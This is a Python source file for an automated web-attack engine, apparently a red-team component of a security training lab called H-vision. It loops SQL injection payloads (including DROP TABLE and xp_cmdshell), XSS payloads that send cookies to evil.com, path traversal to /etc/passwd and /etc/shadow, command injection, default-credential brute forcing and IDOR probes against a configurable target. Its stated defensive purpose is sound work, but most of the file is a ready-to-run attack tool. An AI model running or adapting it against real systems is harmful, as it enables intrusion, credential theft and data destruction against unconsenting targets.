"""
H-vision Red Team Agent — Massive Attack Engine
=================================================
Fires a comprehensive suite of attack payloads against the target application:
  - SQL Injection (10+ payloads)
  - Cross-Site Scripting / XSS (8+ payloads)
  - Path Traversal / LFI (8+ payloads)
  - Authentication Brute Force (10+ credentials)
  - Command Injection (6+ payloads)
  - Insecure Direct Object Reference (IDOR)
  - HTTP Header Injection
  - Server-Side Parameter Pollution

Every attack is reported to the H-vision API so the Blue Team can detect,
analyze, and autonomously improve defenses.
"""

import asyncio
import logging
import os
import random
import time
import httpx
from typing import List, Dict, Any

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [RedAgent] %(levelname)s — %(message)s"
)
logger = logging.getLogger("red_agent")

TARGET_URL   = os.getenv("TARGET_URL",   "http://target_app:8001")
API_URL      = os.getenv("API_URL",      "http://api:8000")
INTERNAL_TOKEN = os.getenv("INTERNAL_SERVICE_TOKEN", "internal-service-token-change-in-prod")
CYCLE_DELAY  = int(os.getenv("ATTACK_CYCLE_DELAY", "45"))   # seconds between full cycles

# ──────────────────────────────────────────────────────────────
#  ATTACK PAYLOAD LIBRARY
# ──────────────────────────────────────────────────────────────

SQL_INJECTION_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "'; DROP TABLE users;--",
    "' UNION SELECT username, password FROM users--",
    "' AND SLEEP(5)--",
    "1; SELECT * FROM information_schema.tables--",
    "' OR EXISTS(SELECT 1 FROM users WHERE username='admin')--",
    "admin'--",
    "1' ORDER BY 10--",
    "' UNION ALL SELECT NULL,NULL,NULL--",
    "1 AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
    "'; EXEC xp_cmdshell('whoami');--",
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(document.cookie)>",
    "<svg onload=fetch('http://evil.com/?c='+document.cookie)>",
    "javascript:alert('XSS')",
    "<iframe src='javascript:alert(1)'></iframe>",
    "'\"><script>document.location='http://evil.com/?'+document.cookie</script>",
    "<body onload=alert('XSS')>",
    "<input autofocus onfocus=alert(1)>",
    "{{7*7}}",   # SSTI probe
    "${7*7}",    # EL injection probe
]

PATH_TRAVERSAL_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../../etc/shadow",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "....//....//etc/passwd",
    "/proc/self/environ",
    "../../../../windows/win.ini",
    "../../../../boot.ini",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
]

BRUTE_FORCE_CREDENTIALS = [
    ("admin",    "admin"),
    ("admin",    "password"),
    ("admin",    "123456"),
    ("root",     "root"),
    ("root",     "toor"),
    ("admin",    "admin123"),
    ("test",     "test"),
    ("user",     "user"),
    ("guest",    "guest"),
    ("operator", "operator"),
]

COMMAND_INJECTION_PAYLOADS = [
    "; ls -la",
    "| cat /etc/passwd",
    "&& whoami",
    "; id",
    "$(id)",
    "`whoami`",
    "| net user",
    "; ping -c 1 attacker.com",
]

IDOR_IDS = ["1", "2", "99", "100", "admin", "0", "-1", "null"]

# ──────────────────────────────────────────────────────────────
#  ATTACK FUNCTIONS
# ──────────────────────────────────────────────────────────────

async def attack_sql_injection(client: httpx.AsyncClient) -> List[Dict]:
    """Fire SQL Injection payloads at every vulnerable endpoint."""
    results = []
    endpoints = [
        ("/search",    "q"),
        ("/login",     "username"),
        ("/products",  "id"),
        ("/user",      "id"),
    ]
    for path, param in endpoints:
        for payload in SQL_INJECTION_PAYLOADS:
            try:
                r = await client.get(f"{TARGET_URL}{path}", params={param: payload}, timeout=5)
                logger.info(f"[SQLi] {path}?{param}={payload[:30]}...  → {r.status_code}")
                results.append({"type": "sql_injection", "path": path, "payload": payload, "status": r.status_code})
            except Exception as e:
                logger.warning(f"[SQLi] {path} error: {e}")
            await asyncio.sleep(0.3)
    return results


async def attack_xss(client: httpx.AsyncClient) -> List[Dict]:
    """Fire XSS payloads against input endpoints."""
    results = []
    endpoints = [
        ("/comment",  {"content": ""}),
        ("/search",   {"q": ""}),
        ("/profile",  {"bio": ""}),
        ("/feedback", {"message": ""}),
    ]
    for path, body_template in endpoints:
        for payload in XSS_PAYLOADS:
            try:
                data = {k: payload for k in body_template}
                r_get = await client.get(f"{TARGET_URL}{path}", params={"q": payload}, timeout=5)
                logger.info(f"[XSS]  {path} payload={payload[:25]}...  → {r_get.status_code}")
                results.append({"type": "xss", "path": path, "payload": payload, "status": r_get.status_code})
            except Exception as e:
                logger.warning(f"[XSS] {path} error: {e}")
            await asyncio.sleep(0.3)
    return results


async def attack_path_traversal(client: httpx.AsyncClient) -> List[Dict]:
    """Fire path traversal / LFI payloads."""
    results = []
    endpoints = ["/file", "/download", "/read", "/static"]
    for path in endpoints:
        for payload in PATH_TRAVERSAL_PAYLOADS:
            try:
                r = await client.get(f"{TARGET_URL}{path}", params={"name": payload, "path": payload}, timeout=5)
                logger.info(f"[PATH] {path}?name={payload[:30]}  → {r.status_code}")
                results.append({"type": "path_traversal", "path": path, "payload": payload, "status": r.status_code})
            except Exception as e:
                logger.warning(f"[PATH] {path} error: {e}")
            await asyncio.sleep(0.3)
    return results


async def attack_brute_force(client: httpx.AsyncClient) -> List[Dict]:
    """Brute force the login endpoint with common credential pairs."""
    results = []
    for username, password in BRUTE_FORCE_CREDENTIALS:
        try:
            r = await client.post(
                f"{TARGET_URL}/login",
                json={"username": username, "password": password},
                timeout=5
            )
            logger.info(f"[BRUTE] {username}:{password}  → {r.status_code}")
            results.append({"type": "brute_force", "path": "/login", "payload": f"{username}:{password}", "status": r.status_code})
        except Exception as e:
            logger.warning(f"[BRUTE] login error: {e}")
        await asyncio.sleep(0.4)
    return results


async def attack_command_injection(client: httpx.AsyncClient) -> List[Dict]:
    """Fire command injection payloads."""
    results = []
    endpoints = ["/ping", "/exec", "/run", "/process", "/diagnostics"]
    for path in endpoints:
        for payload in COMMAND_INJECTION_PAYLOADS:
            try:
                r = await client.get(f"{TARGET_URL}{path}", params={"host": payload, "cmd": payload}, timeout=5)
                logger.info(f"[CMD]  {path} payload={payload}  → {r.status_code}")
                results.append({"type": "command_injection", "path": path, "payload": payload, "status": r.status_code})
            except Exception as e:
                logger.warning(f"[CMD] {path} error: {e}")
            await asyncio.sleep(0.3)
    return results


async def attack_idor(client: httpx.AsyncClient) -> List[Dict]:
    """Test for Insecure Direct Object Reference vulnerabilities."""
    results = []
    endpoints = ["/user", "/admin/user", "/order", "/invoice", "/document"]
    for path in endpoints:
        for obj_id in IDOR_IDS:
            try:
                r = await client.get(f"{TARGET_URL}{path}/{obj_id}", timeout=5)
                logger.info(f"[IDOR] {path}/{obj_id}  → {r.status_code}")
                results.append({"type": "idor", "path": f"{path}/{obj_id}", "payload": obj_id, "status": r.status_code})
            except Exception as e:
                logger.warning(f"[IDOR] {path}/{obj_id} error: {e}")
            await asyncio.sleep(0.2)
    return results


async def report_attacks_to_api(all_results: List[Dict], run_id: str):
    """
    Send a consolidated attack report to the H-vision API so the
    Blue Team SOC pipeline can detect, analyze, and patch.
    """
    if not all_results:
        return

    summary = {}
    for r in all_results:
        t = r.get("type", "unknown")
        summary[t] = summary.get(t, 0) + 1

    payload = {
        "run_id": run_id,
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "target": TARGET_URL,
        "total_attacks": len(all_results),
        "summary": summary,
        "results": all_results[:100],  # cap to 100 for API payload size
    }

    try:
        async with httpx.AsyncClient(timeout=10) as api_client:
            r = await api_client.post(
                f"{API_URL}/api/v1/red-team/report",
                json=payload,
                headers={"X-Internal-Token": INTERNAL_TOKEN}
            )
            logger.info(f"[RedAgent] Attack report sent to API → {r.status_code}")
    except Exception as e:
        logger.warning(f"[RedAgent] Could not send report to API: {e} (Blue Team still logs locally)")


# ──────────────────────────────────────────────────────────────
#  MAIN LOOP
# ──────────────────────────────────────────────────────────────

async def run_attack_cycle(cycle: int):
    run_id = f"red-cycle-{cycle}-{int(time.time())}"
    logger.info(f"\n{'='*60}")
    logger.info(f"  H-VISION RED TEAM — ATTACK CYCLE #{cycle}")
    logger.info(f"  Target: {TARGET_URL}")
    logger.info(f"  Run ID: {run_id}")
    logger.info(f"{'='*60}")

    all_results: List[Dict] = []

    async with httpx.AsyncClient(
        follow_redirects=True,
        headers={"User-Agent": "H-vision/RedTeam SecurityScanner/2.0"}
    ) as client:

        # Check target is alive
        try:
            probe = await client.get(f"{TARGET_URL}/health", timeout=5)
            logger.info(f"[RedAgent] Target health check: {probe.status_code}")
        except Exception:
            logger.warning(f"[RedAgent] Target {TARGET_URL} not reachable. Skipping cycle.")
            return

        logger.info("[RedAgent] ── Phase 1: SQL Injection ──────────────────────")
        all_results += await attack_sql_injection(client)

        logger.info("[RedAgent] ── Phase 2: XSS ──────────────────────────────")
        all_results += await attack_xss(client)

        logger.info("[RedAgent] ── Phase 3: Path Traversal / LFI ─────────────")
        all_results += await attack_path_traversal(client)

        logger.info("[RedAgent] ── Phase 4: Brute Force ──────────────────────")
        all_results += await attack_brute_force(client)

        logger.info("[RedAgent] ── Phase 5: Command Injection ─────────────────")
        all_results += await attack_command_injection(client)

        logger.info("[RedAgent] ── Phase 6: IDOR ──────────────────────────────")
        all_results += await attack_idor(client)

    logger.info(f"\n[RedAgent] ✅ Cycle #{cycle} complete — {len(all_results)} attacks fired")
    logger.info(f"[RedAgent] 📡 Reporting to H-vision Blue Team for analysis...")
    await report_attacks_to_api(all_results, run_id)
    logger.info(f"[RedAgent] 🛡️  Blue Team SOC pipeline will now analyze and patch.\n")


async def main():
    logger.info("H-vision Red Team Agent starting...")
    logger.info(f"Target: {TARGET_URL} | API: {API_URL}")
    logger.info(f"Attack cycle every {CYCLE_DELAY}s")

    # Wait for target and API to be ready
    await asyncio.sleep(15)

    cycle = 1
    while True:
        try:
            await run_attack_cycle(cycle)
        except Exception as e:
            logger.error(f"[RedAgent] Cycle #{cycle} failed: {e}")
        cycle += 1
        logger.info(f"[RedAgent] Sleeping {CYCLE_DELAY}s before next cycle...")
        await asyncio.sleep(CYCLE_DELAY)


if __name__ == "__main__":
    asyncio.run(main())
